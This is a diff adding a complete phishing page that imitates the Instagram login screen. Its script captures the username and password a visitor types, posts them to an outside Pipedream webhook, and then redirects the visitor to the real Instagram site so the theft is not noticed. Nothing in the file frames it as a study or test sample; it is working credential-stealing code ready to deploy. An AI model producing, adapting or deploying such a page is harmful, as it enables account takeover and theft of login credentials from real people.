@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            width: 350px;
+            padding: 40px 40px 20px;
+            text-align: center;
+            box-shadow: 0 0 5px rgba(0,0,0,0.05);
+        }
+        h1 {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-size: 36px;
+            margin: 0 0 20px;
+            background: -webkit-linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 700;
+            letter-spacing: -1px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        label {
+            font-size: 12px;
+            color: #8e8e8e;
+            text-align: left;
+            margin-top: 5px;
+        }
+        input {
+            padding: 9px 8px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            width: 100%;
+            box-sizing: border-box;
+            font-size: 12px;
+            background: #fafafa;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
+        button {
+            background-color: #3897f0;
+            border: none;
+            color: white;
+            font-weight: 600;
+            border-radius: 3px;
+            padding: 7px 0;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #2887e0;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        .footer a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Instagram</h1>
+        <form id="loginForm">
+            <label for="username">Phone number, username, or email</label>
+            <input type="text" id="username" name="username" required>
+            
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+            
+            <button type="submit">Log in</button>
+        </form>
+        <div class="footer">
+            <a href="#">Forgot login details?</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Send data to your Pipedream webhook
+            fetch('https://eosr9njwgl8l5j9.m.pipedream.net/', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: username,
+                    password: password
+                })
+            }).then(() => {
+                // Redirect to real Instagram
+                window.location.href = 'https://www.instagram.com/';
+            }).catch(err => {
+                console.error('Error:', err);
+                // Fallback redirect even if webhook fails
+                window.location.href = 'https://www.instagram.com/';
+            });
+        });
+    </script>
+</body>
+</html>
